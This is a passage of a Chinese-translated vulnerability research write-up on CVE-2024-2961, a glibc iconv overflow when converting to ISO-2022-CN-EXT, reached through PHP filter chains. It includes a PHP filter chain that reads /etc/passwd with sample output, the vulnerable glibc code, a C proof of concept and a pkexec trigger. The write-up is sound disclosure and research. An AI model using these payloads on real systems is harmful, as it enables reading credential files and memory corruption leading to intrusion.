plain">00000a40: 2f00 6200 6900 6e00 2f00 6600 6100 6c00  /.b.i.n./.f.a.l.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000a50: 7300 6500 0a00                           s.e...</span><br></span></code></pre></div></div>
<p>大量的过滤器和链接它们的可能性导致了对 PHP 的一些伟大研究，例如 <a href="https://gynvael.coldwind.pl/?id=671" target="_blank" rel="noopener noreferrer">here</a>、<a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d" target="_blank" rel="noopener noreferrer">here</a> 或 <a href="https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py" target="_blank" rel="noopener noreferrer">here</a>。事实上，使用精确选择的过滤器（过滤器链），攻击者可以做一些奇妙的事情，例如<a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it" target="_blank" rel="noopener noreferrer">完全更改文件的内容</a>，或者使用<a href="/en/docs/个人知识库/CTF/奇技淫巧/(https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle).">基于错误的预言机逐个提取其字节</a>。</p>
<p>例如，这里有一个过滤器链，它预设 <code>Hello world!</code> 为 <code>/etc/passwd</code> ：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM860.UTF16|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.855.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L5.UTF-32|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.ISO2022KR.UTF16|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.855.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd</span><br></span></code></pre></div></div>
<p>结果：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Hello, world!!!root:x:0:0:root:/root:/bin/bash...</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="php-过滤器前缀后缀和-crash">PHP 过滤器：前缀、后缀和 crash<a href="#php-过滤器前缀后缀和-crash" class="hash-link" aria-label="Direct link to PHP 过滤器：前缀、后缀和 crash" title="Direct link to PHP 过滤器：前缀、后缀和 crash" translate="no">​</a></h3>
<p>可悲的是，文件读取并不总是像以下那样容易：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo file_get_contents($_POST[&#x27;file&#x27;]);</span><br></span></code></pre></div></div>
<p>通常，文件不会按原样返回，但会以某种方式对其进行解析或检查。举个例子，我经常遇到这段代码的变体，它要求你的文件是有效的 JSON：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$data = file_get_contents($_POST[&#x27;url&#x27;]);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$data = json_decode($data);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo $data-&gt;message;</span><br></span></code></pre></div></div>
<p>我们在这里读取了一个文件，但内容随后被 JSON 反序列化，并且只返回文档的一部分。为了读取标准文件，例如 <code>/etc/passwd</code> ，我们需要向流添加任意前缀和后缀。像这样： <code>{&quot;message&quot;: &quot;&lt;contents-of-/etc/passwd&gt;&quot;}</code> .在 2023 年底，情况是您可以使用 <code>php://filter</code> 链为流添加前缀，但不能添加后缀。因此，我开始研究一种算法来做后者。</p>
<p>当时，我对字符集或编码一无所知（老实说，我仍然不知道其中的区别）。首先，我构建了一个暴力破解脚本，该脚本将几个 <code>iconv</code> 过滤器堆叠在一起，并显示结果。像这样：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php://filter/convert.iconv.A.B/convert.iconv.C.D/convert.iconv.E.F/resource=data:,test123</span><br></span></code></pre></div></div>
<p>在某个时候，我的“模糊器”崩溃了。
我一生中大部分时间都在与PHP打交道，我很快就指手画脚。但我不知道的是，这个错误在调用链中的位置要低得多：一直到glibc。</p>
<p><em>注意：该研究产生了一个于 2023 年 12 月发布的工具：<a href="https://www.ambionics.io/blog/wrapwrap-php-filters-suffix" target="_blank" rel="noopener noreferrer">wrapwrap</a>.。</em></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="glibc-中存在一个错误cve-2024-2961">Glibc 中存在一个错误CVE-2024-2961<a href="#glibc-中存在一个错误cve-2024-2961" class="hash-link" aria-label="Direct link to Glibc 中存在一个错误CVE-2024-2961" title="Direct link to Glibc 中存在一个错误CVE-2024-2961" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-iconv-api">The <code>iconv()</code> API<a href="#the-iconv-api" class="hash-link" aria-label="Direct link to the-iconv-api" title="Direct link to the-iconv-api" translate="no">​</a></h3>
<p>当PHP从一个字符集转换为另一个字符集时，它使用iconv，这是一个API，“使用转换描述符将输入缓冲区中的字符转换为输出缓冲区”。在 Linux 上，此 API 由 glibc 实现。</p>
<p>API 非常简单。首先打开一个转换描述符，该描述符指示输入和输出字符集。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">iconv_t iconv_open(const char *tocode, const char *fromcode);</span><br></span></code></pre></div></div>
<p>然后，您可以使用 <code>iconv()</code> 将输入缓冲区 <code>inbuf</code> 转换为输出缓冲区中 <code>outbuf</code> 的新字符集。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">size_t iconv(iconv_t cd,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            char **restrict inbuf, size_t *restrict inbytesleft,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            char **restrict outbuf, size_t *restrict outbytesleft);</span><br></span></code></pre></div></div>
<p>缓冲区管理由调用方负责。如果输出缓冲区不够大， <code>iconv()</code> 将返回一个错误，指示如此，您将能够通过再次调用 <code>iconv()</code> 重新分配 <code>outbuf</code> 并继续转换。该函数保证的是，它永远不会从 <code>inbuf</code> 中读取超过 <code>inbytesleft</code> 字节的字节数，也不会向 <code>outbuf</code> 写入超过 <code>outbytesleft</code> 字节数的字节数。从不？好吧，理论上......</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="转换为-iso-2022-cn-ext-时出界写入">转换为 ISO-2022-CN-EXT 时出界写入<a href="#转换为-iso-2022-cn-ext-时出界写入" class="hash-link" aria-label="Direct link to 转换为 ISO-2022-CN-EXT 时出界写入" title="Direct link to 转换为 ISO-2022-CN-EXT 时出界写入" translate="no">​</a></h3>
<p>碰巧的是，在将数据转换为 <code>ISO-2022-CN-EXT</code> 字符集时，iconv 可能无法在写入输出缓冲区之前检查输出缓冲区中是否有足够的空间。</p>
<p>实际上， <code>ISO-2022-CN-EXT</code> 它实际上是一个字符集的集合：当它需要对字符进行编码时，它会选择适当的字符集，并发出一个转义序列，指示解码器需要切换到这样的字符集。</p>
<p>下面的代码是负责发出此类转义序列的部分。它由 3 <code>if</code> 个块组成，每个块将不同的转义序列写入 <code>outbuf</code> （指向）。 <code>outptr</code> 如果你看一下第一个 [1] ，你可以看到它以另一个 <code>if()</code> 块为前缀，该块检查输出缓冲区是否足够大以容纳 4 个字符。另外两个 <code>if()</code> [2][3] 则没有。因此，转义序列可能会被写入越界。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// iconvdata/iso-2022-cn-ext.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/* See whether we have to emit an escape sequence.  */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (set != used)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    /* First see whether we announced that we use this</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        character set.  */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8)) // [1]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        const char *escseq;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (outptr + 4 &gt; outend) // &lt;-------------------- BOUND CHECK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            result = __GCONV_FULL_OUTPUT;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            break;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        assert(used &gt;= 1 &amp;&amp; used &lt;= 4);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        escseq = &quot;)A\0\0)G)E&quot; + (used - 1) * 2;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = ESC;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = &#x27;$&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = *escseq++;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = *escseq++;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ann = (ann &amp; ~SO_ann) | (used &lt;&lt; 8);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8)) // [2]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        const char *escseq;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // &lt;-------------------- NO BOUND CHECK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        assert(used == CNS11643_2_set); /* XXX */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        escseq = &quot;*H&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = ESC;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = &#x27;$&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = *escseq++;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = *escseq++;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; 8);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8)) // [3]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        const char *escseq;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // &lt;-------------------- NO BOUND CHECK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        assert((used &gt;&gt; 5) &gt;= 3 &amp;&amp; (used &gt;&gt; 5) &lt;= 7);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        escseq = &quot;+I+J+K+L+M&quot; + ((used &gt;&gt; 5) - 3) * 2;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = ESC;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = &#x27;$&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = *escseq++;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *outptr++ = *escseq++;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; 8);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>要触发 bug，我们需要在输出缓冲区结束之前强制 <code>iconv()</code> 发出转义序列。为此，我们可以使用外来字符，例如： <code>劄</code> 、 <code>䂚</code> 或 <code>峛</code> <code>湿</code> 。结果是 1 到 3 个字节的溢出，其值如下：</p>
<ul>
<li><code>$*H</code> [<code>24 2A 48</code>]</li>
<li><code>$+I</code> [<code>24 2B 49</code>]</li>
<li><code>$+J</code> [<code>24 2B 4A</code>]</li>
<li><code>$+K</code> [<code>24 2B 4B</code>]</li>
<li><code>$+L</code> [<code>24 2B 4C</code>]</li>
<li><code>$+M</code> [<code>24 2B 4D</code>]</li>
</ul>
<p>快速<a href="https://github.com/ambionics/cnext-exploits/blob/main/poc.c" target="_blank" rel="noopener noreferrer">POC</a> 演示了该错误：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ gcc -o poc ./poc.c &amp;&amp; ./poc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">*/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">void hexdump(void *ptr, int buflen)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">void main()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    iconv_t cd = iconv_open(&quot;ISO-2022-CN-EXT&quot;, &quot;UTF-8&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    char input[0x10] = &quot;AAAAA劄&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    char output[0x10] = {0};</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    char *pinput = input;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    char *poutput = output;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // Same size for input and output buffer: 8 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    size_t sinput = strlen(input);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    size_t soutput = sinput;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    iconv(cd, &amp;pinput, &amp;sinput, &amp;poutput, &amp;soutput);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    printf(&quot;Remaining bytes (should be &gt; 0): %zd\n&quot;, soutput);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hexdump(output, 0x10);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>这在易受攻击的系统上产生：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ gcc -o poc ./poc.c &amp;&amp; ./poc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Remaining bytes (should be &gt; 0): -1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">000000: 41 41 41 41  41 1b 24 2a  48 00 00 00  00 00 00 00    AAAA A.$* H... ....</span><br></span></code></pre></div></div>
<p>已经写了九个字节，尽管告诉 <code>iconv()</code> 最多写八个字节。</p>
<p>Checking the <a href="https://github.com/lattera/glibc/commit/755104edc75c53f4a0e7440334e944ad3c6b32fc#diff-c55a50730dd1a15db405b851229d49697508e27710403e4995f0f9d628295c36" target="_blank" rel="noopener noreferrer">commit history</a>, I noticed that the bug was very old: it appeared in year 2000, making it 24 years old.
检查提交<a href="https://github.com/lattera/glibc/commit/755104edc75c53f4a0e7440334e944ad3c6b32fc#diff-c55a50730dd1a15db405b851229d49697508e27710403e4995f0f9d628295c36" target="_blank" rel="noopener noreferrer">历史记录</a>，我注意到这个错误非常古老：它出现在 2000 年，距今已有 24 年的历史。
现在，这个错误可以做什么？</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="条件和原始">条件和原始<a href="#条件和原始" class="hash-link" aria-label="Direct link to 条件和原始" title="Direct link to 条件和原始" translate="no">​</a></h3>
<p>有了这个漏洞，我有一个 1 到 3 个字节的溢出，其中包含非受控字符。这并不多。除此之外，还有先决条件。我需要找到一个电话， <code>iconv()</code> 其中我：</p>
<ul>
<li>controlled the output charset (<code>ISO-2022-CN-EXT</code>)
控制输出字符集 （ <code>ISO-2022-CN-EXT</code> ）</li>
<li>controlled part of the input buffer (to put in the beautiful chinese characters)
输入缓冲区的受控部分（输入漂亮的汉字）</li>
</ul>
<p>考虑到这一点，我开始寻找目标。从在我的 <code>/lib</code> 目录 <code>/bin</code> <code>iconv</code> 中学习到迭代数百个 OSS 项目，我发现了一些有趣的目标。实际上没有一个是可利用的。
举个例子，让我们看一个非常有前途的目标： <code>libxml2</code> .</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="libxml2字节的海洋">libxml2：字节的海洋<a href="#libxml2字节的海洋" class="hash-link" aria-label="Direct link to libxml2：字节的海洋" title="Direct link to libxml2：字节的海洋" translate="no">​</a></h4>
<p><strong>libxml2</strong> 仅处理 UTF-8 格式的 XML。如果 XML 文档不是 UTF-8，它将被转换为它，然后进行处理，然后在完成所有操作后转换回其原始字符集。转换是使用 <code>iconv()</code> .</p>
<p>因此，我们可以通过这样的文件满足我们的先决条件：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-2022-CN-EXT&quot;?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;root&gt;&amp;21124;&lt;/root&gt;</span><br></span></code></pre></div></div>
<p><em>注意：21124 是 劄 的 unicode 代码位。</em></p>
<p>现在，请记住：缓冲区管理是调用方的责任。当用于 <code>iconv()</code> 将我们的文档转换回其原始字符集时 <code>libxml2</code> ，它会分配一个输出缓冲区，该缓冲区是输入缓冲区（代码）的 4 倍。对我们来说太大了：我们无法达到缓冲区的边界以溢出。死胡同。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="pkexec4-个字节太多了">pkexec：4 个字节太多了<a href="#pkexec4-个字节太多了" class="hash-link" aria-label="Direct link to pkexec：4 个字节太多了" title="Direct link to pkexec：4 个字节太多了" translate="no">​</a></h4>
<p>另一个有趣的目标是 pkexec，一个存在于许多 linux 发行版中的 setuid 二进制文件。二进制文件允许您通过设置 <code>CHARSET</code> 环境变量来为其输出的每条消息选择字符集。例：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ CHARSET=ISO-2022-CN-EXT pkexec &#x27;trigger劄&#x27; 2&gt;&amp;1 | hexyl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">┌────────┬─────────────────────────┬─────────────────────────┬────────┬────────┐</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│00000000│ 43 61 6e 6e 6f 74 20 72 ┊ 75 6e 20 70 72 6f 67 72 │Cannot r┊un progr│</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│00000010│ 61 6d 20 74 72 69 67 67 ┊ 65 72 1b 24 2a 48 1b 4e │am trigg┊er•$*H•N│</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│00000020│ 4c 61 0f 3a 20 4e 6f 20 ┊ 73 75 63 68 20 66 69 6c │La•: No ┊such fil│</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│00000030│ 65 20 6f 72 20 64 69 72 ┊ 65 63 74 6f 72 79 0a    │e or dir┊ectory_ │</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└────────┴─────────────────────────┴─────────────────────────┴────────┴────────┘</span><br></span></code></pre></div></div>
<p>在内部， <code>pkexec</code> 使用 输出 <code>GLib</code> 其消息。它执行以下操作：</p>
